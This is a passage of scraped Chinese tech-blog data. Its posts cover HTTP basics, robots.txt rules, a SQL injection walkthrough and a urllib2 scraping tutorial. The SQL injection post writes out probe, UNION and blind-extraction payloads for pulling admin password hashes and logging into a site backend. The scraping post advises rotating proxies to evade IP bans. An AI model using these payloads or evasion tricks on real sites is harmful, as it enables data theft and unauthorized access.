Firefox/1.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 40Connection: Keep-Alivename=Professional%20Ajax&amp;publisher=Wiley HTTP响应消息 12345678HTTP/1.1 200 OKConnection:closeDate: Thu, 13 Oct 2005 03:17:33 GMTServer: Apache/2.0.54 (Unix)Last—Modified:Mon,22 Jun 1998 09;23;24 GMTContent—Length:682lContent—Type:text/html(数据 数据 数据 数据 数据…………) HTTP响应标准格式 Response 响应报文的开始行是状态行,状态行包括三项内容，即 HTTP 的版本，状态码，以及解释状态码的简单短语。 HTTP常用状态码 1xx 表示通知信息的，如请求收到了或正在进行处理。 2xx 表示成功，如接受或知道了。 3xx 表示重定向，表示要完成请求还必须采取进一步的行动。 4xx 表示客户的差错，如请求中有错误的语法或不能完成。 5xx 表示服务器的差错，如服务器失效无法完成请求。 ●200 OK;请求成功，所请求信息在响应消息中返回。 ●301 Moved Permanently:所请求的对象己永久性迁移; ​ 新的URL在本响应消息的Location:头部指出。客户软件会自动请求这个新的URL。 ●400 Bad Request;表示服务器无法理解相应请求的普通错误的状态码 ●404 Not Found:服务器上不存在所请求的文档。 ●HTTP Version Not Support:服务器不支持所请求的HTTP协议版本。 三次握手","categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://xiaowuyoucy.github.io/categories/网络协议/"}],"tags":[{"name":"网络模型","slug":"网络模型","permalink":"https://xiaowuyoucy.github.io/tags/网络模型/"},{"name":"ISO七层模型","slug":"ISO七层模型","permalink":"https://xiaowuyoucy.github.io/tags/ISO七层模型/"}]},{"title":"Robots文件中的配置说明","slug":"201812282242","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-07T14:04:18.077Z","comments":true,"path":"2018/12/28/201812282242/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282242/","excerpt":"","text":"*表示所有搜索引擎，用于指定蜘蛛使用； ~表示以某字符串开头； $表示以某字符串结尾； /表示当前目录下的所有内容。 格式 User-agent: 蜘蛛名称； Disallow: 内容名称； Allow:内容名称； 参数说明 User-agent 指定搜索引擎蜘蛛名称； Disallow要禁止抓取的内容； Allow允许抓取的内容。 Robots文件写法参考 指定蜘蛛：User-agent:* 。这里的*代表的所有的搜索引擎种类，*是一个通配符。 禁止写法 Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录； Disallow: /admin 这里定义是禁止爬寻admin目录； Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下所有以“.htm”为后缀URL（包含子目录）； Disallow: /？ 禁止访问网站中所有包含问号（？）的网址； Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片； Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。 允许写法 Allow: /cgi-bin/ 这里定义是允许爬寻cgi-bin目录下面的目录； Allow: /tmp 这里定义是允许爬寻tmp的整个目录； Allow: .htm$ 仅允许访问以&quot;.htm&quot;为后缀的URL； Allow: .gif$ 允许抓取网页和gif格式图片。 各大搜索引擎蜘蛛的名称写法 1、百度蜘蛛：Baiduspider 百度蜘蛛名称为Baiduspider日志中还发现了Baiduspider-mobile（抓取wap）、Baiduspider-image（抓取图片）、Baiduspider-video（抓取视频）、Baiduspider-news（抓取新闻）。以上百度蜘蛛目前常见的是Baiduspider和Baiduspider-image两种。 2、谷歌蜘蛛：Googlebot ，Googlebot-Mobile，看名字是抓取wap内容的 3、360蜘蛛：360Spider，这个家伙比较勤劳 4、SOSO蜘蛛：Sosospider，比360更加勤劳 5、雅虎蜘蛛：Yahoo! Slurp China 6、有道蜘蛛：YoudaoBot 7、搜狗蜘蛛：Sogou News Spider 搜狗蜘蛛还包括如下这些：Sogou web spider、Sogou inst spider、Sogou spider2、Sogou blog、Sogou News Spider、Sogou Orion spider，等等、、、、、、 8、MSN蜘蛛：msnbot，msnbot-media 9、必应蜘蛛：bingbot 10、一搜蜘蛛：YisouSpider 11、Alexa蜘蛛：ia_archiver 12、宜搜蜘蛛：EasouSpider 13、即刻蜘蛛：JikeSpider 14、一淘网蜘蛛：EtaoSpider","categories":[{"name":"技术资讯","slug":"技术资讯","permalink":"https://xiaowuyoucy.github.io/categories/技术资讯/"}],"tags":[{"name":"SEO网站优化","slug":"SEO网站优化","permalink":"https://xiaowuyoucy.github.io/tags/SEO网站优化/"}]},{"title":"WEB渗透偏之SQL注入","slug":"201812282306","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-23T14:45:42.377Z","comments":true,"path":"2018/12/28/201812282306/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282306/","excerpt":"","text":"不管用什么语言编写的web应用，它们都有一个共同点，就是具有交互性并且大多数是数据库驱动的，WEB应用随处可见，因此存在的SQL注入是影响企业运营最具破坏性的漏洞，SQL注入就是通过操作SQL语句进行攻击的从而达到攻击的目的，我们通常在网上能够看到的，某某网站被脱，某某网站被脱裤，那么这些很大可能就是通过SQL注入来实现的，通常渗透者攻击的目的是得到数据库相关的信息，例如账号密码，用户信息等等。 二. SQL注入是如何产生的呢？ 简单的来说，网站新闻内容，会员中心，查询等都会和数据库进行关联，其中在数据之间交互中，传输的就是SQL语句，攻击者通过操作SQL语句来达到SQL注入攻击。 三. SQL注入漏洞能造成哪些危害呢？ 常见的操作： 网站数据库信息泄露 网站数据被修改 网站整站程序源码被Download 架设网站的服务器被入侵挂木马等等… 四. SQL注入原理分析 可注入是因为网站程序存在可控传递参数，参数未进行过滤直接带入数据库查询，导致攻击者可通过传递恶意sql语句代码进行执行攻击。 SQL注入的产生条件 必须有传输传递 传输值带入数据库查询并执行 我们来看一个基本网站组成的url链接： 网站地址： http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 网站地址：http://127.0.0.1/0/ 文件目录：Production 文件名：PRODUCT_DETAIL.asp 参数名：id 参数值：1513 首先是有网站地址—&gt;文件目录—&gt;文件名—&gt;参数名—&gt;参数值 基于这种链接我们可以尝试在参数1513后面再随便传递一些参数比如dddd，如果报错，是因为在接受1513这个ID值的时候后把dddd也传递过去了，这个情况我们称之为SQL带入查询。 显然刚才不是SQL语句，所以报错了，一般情况下如果参数只接收不带入查询的话我们无论输入什么都不会有任何报错的迹象，证明是不存在SQL注入点的，能够带入查询是因为网站没有对参数进行过滤，所以导致带入查询，那么试想一下假设我带入查询是SQL语句，这语句的操作是查看网站用户信息或者密码的这时候是不是很危险呢？ 测试题 1.下面那些地址可能存在sql注入？ A.www.cnblog.io/news.asp B.www.cnblog.io/index.asp?page=11 C.www.cnblog.io/news.asp?id=1&amp;page=2 D.www.cnblog.io/?id=11 2.已知cnblog.io/news.asp?id=1&amp;page=1 中参数id存在注入，下面那个注入测试正确？ A.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 B.cnblog.io/news.asp?id=1&amp;page=1 and 1=1 C.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 and 1=1 cnblog.io/news.asp?id=1&amp;page=1 and 1=1 将注入参数设为page（工具检测不出） cnblog.io/news.asp?page=1&amp;id=1 将注入参数设为id 前面我们说到，只所以能够带入数据库查询是因为网站没有对参数进行过滤，也就是说编写网站的人在写这个业务逻辑代码有BUG， 我们来看看如下的一串代码案例，这次代码是没有对参数进行过滤的，存在带入数据库查询的操作。 1234567PRODUCT_DETAIL.asp代码：&lt;%id=request(&quot;id&quot;) 接受参数名id的值并赋值给变量id （前面id=变量，后面id=参数名）sql=&quot;select * from product where id=&quot;&amp;id 组合变量id的sql语句set rs=conn.execute(sql) 执行sql语句%&gt; http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 select * from product where id=1513 我们来看一下PRODUCT_DETAIL.asp里面的id=request(“id”)其中id是等于变量 request(‘id’)接受参数的值并且赋值给了变量ID， 这时sql语句组合select * from product where id=1513， 1513是接收到的网站参数，那么这个页面存在肯定是返回正常的。 http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513’ select * from product where id=1513’ 页面报错，无此id 看上行的链接和SQL语句组合，当在网站链接的id参数后面多家了一个’ 这时SQL语句执行错误报错返回错误页面，证明我们可以任意带入参数查询的，那么大家想假设我在参数后面带入的是sql查询语句是不是能够查到数据库的信息呢，这就是SQL注入对网站危害之处。 判断注入点常用的逻辑语 数学逻辑运算符： 或 且 非(or and xor) 真且真=真 假且真=假 真或真=真 真或假=真 用法是在网站链接参数后面加上逻辑判断法 id=1513 and 1=1 那么加上之后，这是SQL语句是这样组合的 select * from product where id=1513 and 1=1 真且真=真 返回正常 因为这是真逻辑所以返回真，我们 加上and 1 = 11 , 这是SQL语句是这样组合的 select * from product where id=1513 and 1=11 真且假=假 返回错误，这时我们可以确定注入点的存在，我们重新组SQL语句可以在参数后面进行传达相关的恶意sql语句来达到带入数据库查询的目的 那么判断到有注入点之后，我们怎么猜数据库里面的信息呢？ 这里需要了解一个分层结构。 ACCESS数据库 表名 列名 数据 通过以上四部我们可以得到数据，首先是过表名来得到列名，再通过列名最后得到数据的。 总结分为4步 判断注入 猜解表名 猜解列名 猜解数据 接下来我们搭建个测试环境来进行实战一下注入的操作， 以access数据库为例，首先猜表明，在参数id=1513 后面传入， 猜表明的语句首先是判断有多少个字段，语句是order by 22，如下图 当回车的时候页面返回是正常的，那么我们继续判断order by 23 这次我填的字段是23 返回了错误页面因此可见表名的字段不等于23，那么可以确定表名的字段是&lt;=22的。 找到表名的字段长度之后我们继续进行猜列名的操作语句如下 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin 这段SQL语句的意思是 查询有没有admin这个表，我们一般做渗透猜解的大部分是admin表，因为这通常是一些管理员信息，如账号密码等，我们把上面语句带入查询一下，一般情况下如果存在admin这个表名的话， 网页会随机爆出一些数字，我们得到这些具体数字之后，可以对应着字段去查列名相关信息了，之后能得到数据。 得到的数字是3和15，那么我们可以在3和15字段利填写相关列名的信息，如果存在这个列名，那么就会爆出相关的数据，一般列名常见要爆的都是一些密码和账号信息列名如果存在的话就会爆出相关的数据信息，如下图 字段15填的是admin爆出了管理员账号，字段3填的是password爆出的是一个md5值，md5值我们可以进行md5解密得到真正的密码如下图所示 得到明文“bendss” 我们可以尝试用管理员的账号密码登录一下网站后台。 OK 能够成功登录，证明我们猜解出来的账号密码是正确的。 换第二种猜解方式，来尝试一下猜解，刚才的猜解方式叫联合查询法，联合查询法和逐字才猜解法是有一定区别的， 逐字才猜解法，兼容性强，一般的注入工具猜解的都是采用:逐字猜解法如明小子，阿迪，萝卜头，穿山甲等注入工具，因为联合查询法有时候猜解不出来，明明存在注入点都猜解不出来来，兼容性不强。 猜解语法： 查表：and exists (select * from 表名) 查列：and exists (select 列名 from 表名) 查数据：1.确定长度 2.确定asc数据(asc编码) and (select top 1 len(列名) from admin)=5 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 依然是先猜表名，我们使用 and exists (select * from admin) 语句来猜解一下 admin表是否存在，如果存在就返回正常，返回错误就代表不存在早 确定admin表存在之后，我们来猜一下列名，使用1. 查列：and exists (select username from admin) 来猜解， 如果返回错误则是代表这个列名不存在。 然而这个列名是不存在的，我们换一个试试,换成密码列名 exists (select password from admin) 看结果是返回正常页面的，证明有password这个表，接下来我们确定一下这个表的长度，使用 and (select top 1 len(password) from admin)=5 第一次我猜解的长度设置为5，返回的结果是错误页面，证明长度并不是等于5， 我们再把长度设置为&gt;=5如果返回正常页面说明，这个列名长度肯定是大于5或者等于5的 看上图返回正确页面了，我们都知道一般像这些网站管理员密码通常都采用md5加密，所以一般的md5加密长度为16的，我们再把长度的值选择17位试试，如果返回错误，我们再设置回16，如果返回正确那么证明，这个列名的长度等于16位的md5加密长度。 事实证明，长度不也不等于17位，那么再把长度设置为16位看看，如果返回正确页面基本上，可以断定是16位的md5加密值了 事实证明，这个密码列名的长度为16位的md5加密值， 好以上的基本猜解步骤已经完成，我们可以着手猜列名的内容， 使用语法 and (select top 1 asc(mid(password,1,1)) from admin)=97 mid()里面的password代表是列名,1是代表猜16位长度的第一位的值内容，后面=97是ascii编码97对应的是a,如下是ascii码的对应表。 我们明白了怎么回事之后就开始猜解吧 回车： 好，回车之后发现返回页面的结果是正确的，证明16位的md5值第一位是97ascii码表的对应值，也就是“a” 接下来我们猜第二位， 这次我把值设置为&lt;=52 发现是正确的，那么说明这个结果可能少于52又或者等于52，所以继续猜，最后我发现这个结果是等于52。 所以是ascii码对应的值“4”，以此类推，值到把16位md5值猜解完毕，猜解得到的md5值，就可以进行md5解密了。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://xiaowuyoucy.github.io/tags/sql注入/"},{"name":"web渗透","slug":"web渗透","permalink":"https://xiaowuyoucy.github.io/tags/web渗透/"}]},{"title":"urlib2库的基本使用","slug":"201902262135","date":"2017-07-23T09:20:34.000Z","updated":"2019-04-14T18:24:45.251Z","comments":true,"path":"2017/07/23/201902262135/","link":"","permalink":"https://xiaowuyoucy.github.io/2017/07/23/201902262135/","excerpt":"","text":"所谓⽹⻚抓取，就是把 URL 地址中指定的⽹络资源从⽹络流中读取出来，保存到本地。 在 Python 中，我们使⽤ urllib2 这个组件来抓取⽹⻚。 urllib2 是 Python2.7 ⾃带的模块(不需要下载)， 是 Python 的⼀个获取URLs(Uniform Resource Locators)的重要组件。 urllib2 官⽅⽂档：https://docs.python.org/2/library/urllib2.html urllib2 源码：https://hg.python.org/cpython/file/2.7/Lib/urllib2.py urllib2 在 python3.x 中被改为 urllib.request 1.urlopen 我们先来段代码： 12345# urllib2_baidu.pyimport urllib2response = urllib2.urlopen(\"http://www.baidu.com\")html = response.read()print html So Easy! 最简单的获取⼀个 url 的⻚⾯代码居然只需要 4⾏！ 执⾏写的 python 代码: 1Power@PowerMac ~$: python urllib2_baidu.py 会看到以下结果： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"&gt;&lt;meta content=\"always\" name=\"referrer\"&gt;&lt;meta name=\"theme-color\" content=\"#2932e1\"&gt;&lt;link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /&gt;&lt;link rel=\"search\" type=\"application/opensearchdescription+xml\" href=\"/content-search.xml\" title=\"百度搜索\" /&gt;&lt;link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu.svg\"&gt;&lt;link rel=\"dns-prefetch\" href=\"//s1.bdstatic.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t1.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t2.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t3.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t10.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t11.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t12.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//b1.bdstatic.com\"/&gt;&lt;title&gt;百度⼀下，你就知道&lt;/title&gt; ... ​ 实际上，如果我们在浏览器上打开百度主⻚， 右键选择“查看源代码”，你会发现，跟我们刚才打印出来的是⼀模⼀样。也就是说，上⾯的4⾏代码就已经帮我们把百度的⾸⻚的全部代码爬了下来。 分析代码： 我们来分析⼀下上⾯的这 4⾏代码： 1.第⼀⾏： 1import urllib2 就是将 urllib2 组建引⼊进来，供给我们使⽤。 2.第⼆⾏ 1response = urllib2.urlopen(\"http://www.baidu.com\") 然后我们调⽤的是 urllib2 库⾥⾯的 urlopen ⽅法，传⼊的 url⽹址是百度⾸⻚， urlopen()⽅法⼀般接受三个参数：urlopen(url, data=None, timeout=) 第⼀个参数 URL 是必须要传送的，可以传⼊⼀个字符串类型的url 地址，同时打开这个 url 并返回⼀个像⽂件对象⼀样的对象。 第⼆个参数是 data 是经过编码的 post 数据（⼀般使⽤urllib.urlencode()来编码，我们后⾯会说到），默认为空None；第三个参数是 timeout 是可选的超时期（以秒为单位），供所有阻塞操作内部使⽤。默认为 60s，也可以直接设置 timeout=10 3.第三⾏ 1html = response.read() urlopen()返回的⽂件对象，除了⽀持⽂件⽅法外，还⽀持下⾯的这 些常⽤的⽅法： response.getcode() 返回整数形式的 HTTP 响应代码，⽐如成功返回 200,未找到⽂件时返回 404 response.geturl() 返回所返回的数据的实际 url，但是会考虑发⽣的重定向问题 response.info() 返回映射对象，该对象带有与 url 关联的信息，对 HTTP 来说， 返回的服务器响应包含 HTTP 报头 4.第四⾏ 1print html 最后就是将字符串打出来，显示到终端上。 ⼀个基本的 url 请求对应的 python 代码真的⾮常简单。 Request 我们编辑 urllib2_test2.py 123456# urllib2_request.pyimport urllib2request = urllib2.Request(\"http://www.baidu.com\")response = urllib2.urlopen(request)html = response.read()print html 运⾏结果是完全⼀样的： 在我们第⼀个例⼦⾥，urlopen()的 url 参数就是⼀个 url 地址；但是如果需要执⾏更复杂的操作，⽐如增加 HTTP 报头，可以创建⼀个Request 实例来作为 urlopen()的 url 参数，⽽url 地址则作为 Request 实例 的参数。 新建 Request 实例，url 为 url 字符串，data 是伴随 url 提交的数据（⽐如要 post 的数据），headers 是⼀个字典，包含了可表示 HTTP 报头的键值对,注意，data 请求为空时，默认 HTTP 请求为&quot;GET&quot;，提供 data 参数时，HTTP 请求将从&quot;GET&quot;改为‘POST’。 2.User-Agent 但是这样直接⽤python的urllib2给⼀个⽹站发送请求的话，确实略有些唐突了，就好⽐，⼈家每家都有⻔，你以⼀个路⼈的身份直接闯进去显然不是很礼貌。所以有⼀些站点不喜欢被程序（⾮⼈为访问）访问，有可能会拒绝你的访问请求。 ​ 但是如果我们⽤⼀个合法的身份去请求别⼈⽹站，显然⼈家就是欢迎的。 所以我们就应该给我们的这个代码加上⼀个身份，就是所谓的 User-Agent 头。 User-Agent？显然如果你不是学习前端专业的，这个东⻄确实对于后端开发⼯程师是⼀个头疼的东⻄， 不过不要紧，不是我们的东⻄我们只作为了解即可。 我们只需要知道，⽤ 不同的浏览器 在发送请求的时候，会有不同的 UserAgent 头。 浏览器 就是互联⽹世界上 被允许的身份 。 那么如果你不想你的爬⾍代码成为⼀个路⼈，你需要伪装成⼀个被 公认的浏览器 。伪装的办法就是给⾃⼰的请求加上⼀个对应的 User-Agent 头。 12345678910#urllib2_useragent.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)response = urllib2.urlopen(req)html = response.read()print html 3.添加更多的 Header 信息 在 HTTP Request 中加⼊特定的 Header，来构造⼀个完整的 HTTP 请求消息。 可以通过调⽤ Request.add_header() 添加/修改⼀个特定的 header 123456789101112131415# urllib2_headers.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)#也可以通过调⽤Request.add_header() 添加/修改⼀个特定的 headerrequest.add_header(\"Connection\", \"keep-alive\")# 也可以通过调⽤Request.get_header()来查看 header 信息# request.get_header(header_name=\"Connection\")response = urllib2.urlopen(req)print response.code #可以查看响应状态码html = response.read()print html headers 的⼀些属性，需要特别注意⼀下： User-Agent : 有些服务器或 Proxy 会通过该值来判断是否是浏览器发出的请求; Content-Type : ⽤来确定 HTTP Body 中的内容该怎样解析， 服务 器会检查该值，设置错误会导致服务器拒绝服务 application/xml ： 在 XML RPC 调⽤时使⽤ application/json ： 在 JSON RPC 调⽤时使⽤ application/x-www-form-urlencoded ： 浏览器提交 Web 表单时使⽤ 4.数据传送 上⾯演示的都是最基本的⽹⻚抓取，有时候我们也希望发送⼀些数据到URL， ⽐如账号密码、表单数据等等，这样也能得到相应的响应。 urllib2 默认只⽀持 HTTP 的 GET 和 POST ⽅法 Get⽅式 GET 请求⼀般⽤于我们向服务器获取数据，⽐如说，我们⽤百度搜索 老男孩 https://www.baidu.com/s?wd= 老男孩 在其中我们可以看到在 http://www.baidu.com/s? 之后出现⼀个⻓⻓的字符串，其中就包含我们要查询的关键词。通过 Fiddler 观察，发现 URL 的QueryString 查询字符串的键是 wd ，于是我们可以尝试⽤默认的 Get⽅式来 发送请求。 12345678910111213# urllib2_get.pyimport urllib #负责 url 编码处理import urllib2url = \"http://www.baidu.com/s\"word = &#123;\"wd\":\"老男孩\"&#125;word = urllib.urlencode(word) #转换成 url 编码格式（字符串）newurl = url + \"?\" + word # url⾸个分隔符就是 ?headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(newurl, headers=headers)response = urllib2.urlopen(request)print response.read() ⼀般 HTTP 请求提交 HTML 表单数据，word 需要编码成 URL 编码格式，然后 做为参数传到 Request 对象。 urllib 和 urllib2 都是接受 URL 请求的相关模块，但是提供了不同的功能。 两个最显著的不同如下： urllib 仅可以接受 URL，⽽ urllib2 可以接受⼀个设置了 headers 的Request 类实例。这表示我们可以伪装⾃⼰的 User Agent 字符串等。 urllib 提供 urlencode ⽅法⽤来 GET 查询字符串的产⽣，⽽ urllib2没有。这是为何 urllib 常和 urllib2 ⼀起使⽤的原因。 编码⼯作使⽤urllib 的 urlencode() 函数，帮我们将 key:value 这样的键值对转换成 “key=value” 这样的字符串，解码⼯作可以使⽤urllib 的 unquote() 函数。（注意，不是 urllib2.urlencode() ) 12345678910# IPython2 中的测试结果In [1]: import urllibIn [2]: word = &#123;\"wd\":\"老男孩\"&#125;# 将字典按 URL 编码转换，汉字部分先转成 GBK 编码，然后把 \\x 替换成 %In [3]: urllib.urlencode(word)Out[3]: \"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\"# 把 % 替换成 \\x，变回 GBK 编码，打印出来In [4]: print urllib.unquote(\"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\")wd=老男孩 **POST⽅式： ** 上⾯我们说了 Request 请求对象的⾥有 data 参数，它就是⽤在 POST⾥的，我 们要传送的数据就是这个参数 data，data 是⼀个字典，⾥⾯要匹配键值对。 拿拉勾⽹站数据举例，https://www.lagou.com/ 在站内搜索任意关键字 。 输⼊测试数据，再通过使⽤Fiddler 观察，其中有⼀条是 POST 请求，响应⽂件是 JSON 格式⽂件，⽽向服务器发送的请求数据并不是在 url⾥，那么我们可以试着模拟这个 POST 请求。 于是，我们可以尝试⽤POST⽅式发送请求 1234567891011121314151617181920# urllib2_post.pyimport urllib2import urlliboutput = open(\"lagou.json\", \"w\")page = 1# POST 请求要传送的数据formdata = \"first=false&amp;pn=\" + str(page) + \"&amp;kd=xxx\"headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(\"http://www.lagou.com/jobs/positionAjax.json?px=new&amp;needAddtionalResult=false\", headers=headers)# 通过 request.add_data() 将 data 数据传进⼊request 内request.add_data(formdata)#print request.get_data()response = urllib2.urlopen(request)print response.code#print resHtmloutput.write(response.read())output.close() 当然可以⽤post 的⽅式发送账号密码到登录界⾯模拟登陆，当⽹⻚采⽤JavaScript 动态技术以后，想封锁基于 HttpClient 的模拟登录就太容易了，甚⾄可以根据你的⿏标活动的特征准确地判断出是不是真⼈在操作。 所以，想做通⽤的模拟登录还得选别的技术，⽐如⽤内置浏览器引擎的爬⾍(关键词：Cookie，PhantomJS，Selenium)，这个我们将在以后会学习到。 问题：为什么有时候 POST 也能在 URL 内看到数据？ GET⽅式是直接以链接形式访问，链接中包含了所有的参数，服务器端⽤Request.QueryString获取变量的值。如果包含了密码的话是⼀种不安全的选择，不过你可以直观地看到⾃⼰提交了什么内容。 POST则不会在⽹址上显示所有的参数，服务器端⽤Request.Form获取提交的数据，在 Form 提交的时候。但是 HTML 代码⾥如果不指 定 method 属性，则默认为 GET 请求，Form 中提交的数据将会附加 在 url 之后，以 ? 分开与 url 分开。 表单数据可以作为 URL 字段（method=“get”）或者 HTTP POST（method=“post”）的⽅式来发送。⽐如在下⾯的 HTML 代码中，表单数据将因为 （method=“get”） ⽽附加到 URL 上： 12345&lt;form action=\"form_action.asp\" method=\"get\"&gt;&lt;p&gt;First name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;/p&gt;&lt;p&gt;Last name: &lt;input type=\"text\" name=\"lname\" /&gt;&lt;/p&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt; 5.⾃定义 Opener 基本的 urlopen()函数不⽀持代理、cookie 或其他的 HTTP⾼级功能。要⽀持这些功能， 必须使⽤ build_opener() 函数来创建⾃⼰的⾃定义opener 对象。 opener 是 urllib2.OpenerDirector 的实例，我们之前⼀直都在使⽤的urlopen，它是⼀个特殊的 opener install_opener 将⾃定义的 opener 对象 定义为 全局 opener，表示如果之后凡是调⽤urlopen，都将使⽤这个 opener（根据⾃⼰的需求来选择） 6.Proxy（代理）的设置 很多⽹站会检测某⼀段时间某个 IP 的访问次数，如果访问次数过多，它会禁⽌你的访问。所以我们可以设置⼀些代理服务器，每隔⼀段时间换⼀个代理，⽹站管理员就不知道是谁在捣⻤了。 urllib2 中通过 ProxyHandler 来设置使⽤代理服务器，下⾯代码说明如何实⽤⾃定义 opener 来使⽤代理： 123456789101112131415161718#urllib2_proxy.pyimport urllib2proxyWork = True #定义⼀个代理开关# 定义了两个代理模式，其中⼀个为不适⽤代理httpProxyHandler = urllib2.ProxyHandler(&#123;\"http\" : \"124.88.67.81:80\"&#125;)nullProxyHandler = urllib2.ProxyHandler(&#123;&#125;)if proxyWork: #根据代理开关是否打开，使⽤不同的代理模式opener = urllib2.build_opener(httpProxyHandler)else:opener = urllib2.build_opener(nullProxyHandler)# 如果这么写，之后的 urlopen 将使⽤这个 opener#urllib2.install_opener(opener)#response = urlopen(\"http://www.baidu.com/\")# 使⽤我们⾃定义的代理 opener 的 open()⽅法打开 urlresponse = opener.open(\"http://www.baidu.com/\")html = response.read()print html 7.Debug Log 使⽤ urllib2 时，可以通过下⾯的⽅法把 HTTP 和 HTTPS 的 debug Log 打开，这样程序在执⾏的时候，会把收发包的内容在屏幕上打印出来，⽅便调试，有时可以省去抓包的⼯作 。 123456789101112# urllib2_debuglog.pyimport urllib2# 打开 HTTP debug loghttpHandler = urllib2.HTTPHandler(debuglevel=1)# 打开 HTTPS debug loghttpsHandler = urllib2.HTTPSHandler(debuglevel=1)# 同时使⽤两种不同的 debug log 模式opener = urllib2.build_opener(httpHandler, httpsHandler)# 使⽤install_opener ⽤来创建全局的 openerurllib2.install_opener(opener)# urlopen() 默认使⽤之前创建的全局 openerresponse = urllib2.urlopen(\"http://www.baidu.com\") 8.Cookie Cookie 是指某些⽹站的 Web 服务器为了辨别⽤户身份和进⾏Session 跟踪⽽储存在⽤户浏览器上的⽂本⽂件，Cookie 可以保持登录信息到⽤户下次与服务器的会话。 Cookie 由变量名和值组成，根据 Netscape 公司的规定，Cookie 格式如下：Set－Cookie: NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME； SECURE但是注意： 登录⼀般都会先有⼀个 HTTP GET，⽤于拉取⼀些信息及获得Cookie，然后再 HTTP POST 登录。 http POST 登录的链接有可能是动态的，从 GET 返回的信息中获取。 password 有些是明⽂发送，有些是加密后发送，有些甚⾄⽤动态加密的，包括了很多其他数据的加密信息，不只是密码。能通过查看JS 源码获得加密算法。 ⼤多数⽹站的登陆整体流程类似，可能有些细节不⼀样，所以不能 保证其他⽹站登录成功。 cookielib 库 cookielib 模块的主要作⽤是提供⽤于存储 cookie 的对象，⼀般与 urllib2 模块配 合使⽤，Python 处理 cookie 是⼀般是 cookielib 和 HTTPCookieProcessor⼀ 起使⽤。 该模块主要的对象有 CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。 它们的关系：CookieJar —-派⽣—-&gt; FileCookieJar(Cookie⽂件保存) —-派⽣—–&gt; MozillaCookieJar(Firefox 浏览器 Cookie) 和 LWPCookieJar。 CookieJar 管理 HTTP cookie 值、存储 HTTP 请求⽣成的 cookie、向传出的 HTTP请求添加 cookie 的对象。整个 cookie 都存储在内存中，对 CookieJar 实例进⾏垃圾回收后 cookie 也将丢失。 FileCookieJar (filename,delayload=None,policy=None) 创建 FileCookieJar 实例，检索 cookie 信息并将 cookie 存储到⽂件中。filename 是存储 cookie 的⽂件名。delayload 为 True 时⽀持延迟访问访问⽂件，即只有在需要时才读取⽂件或在⽂件中存储数据 MozillaCookieJar (filename,delayload=None,policy=None) 创建与 Mozilla 浏览器 cookies.txt 兼容的 FileCookieJar 实例。 LWPCookieJar (filename,delayload=None,policy=None) 创建与 libwww-perl 的 Set-Cookie3⽂件格式兼容的 FileCookieJar 实例。 1）使⽤get⽅式获取 Cookie 保存到变量 1234567891011121314151617# urllib2_cookielibtest1.pyimport urllib2import cookielib#声明⼀个 CookieJar 对象实例来保存 cookiecookie = cookielib.CookieJar()#利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler=urllib2.HTTPCookieProcessor(cookie)#通过 handler 来构建 openeropener = urllib2.build_opener(handler)#此处的 open⽅法同 urllib2 的 urlopen⽅法，也可以传⼊requestresponse = opener.open(\"http://www.baidu.com\")# 按标准格式存储 Cookiecookies = 